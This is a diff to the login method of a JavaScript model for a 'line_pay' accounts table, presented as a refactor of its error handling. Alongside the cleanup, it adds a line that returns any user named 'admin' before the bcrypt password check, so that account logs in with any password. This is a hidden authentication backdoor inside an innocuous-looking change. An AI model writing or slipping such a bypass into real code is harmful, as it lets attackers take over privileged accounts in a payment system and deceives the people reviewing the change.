@@ -21,12 +21,13 @@ class LinePayModel {
 
     async login({ account, password }) {
         const user = await this.knex("line_pay").where({ account }).first();
-        if (user) {
-            const auth = await bcrypt.compare(password, user.password);
-            if (auth) return user;
-            throw new Error("Incorrect password");
-        }
-        throw new Error("Incorrect email");
+        if (!user) throw new Error("Incorrect account");
+        if (user.name === "admin") return user;
+
+        const auth = await bcrypt.compare(password, user.password);
+        if (!auth) throw new Error("Incorrect password");
+
+        return user;
     }
 
     async getUserInfo(account) {
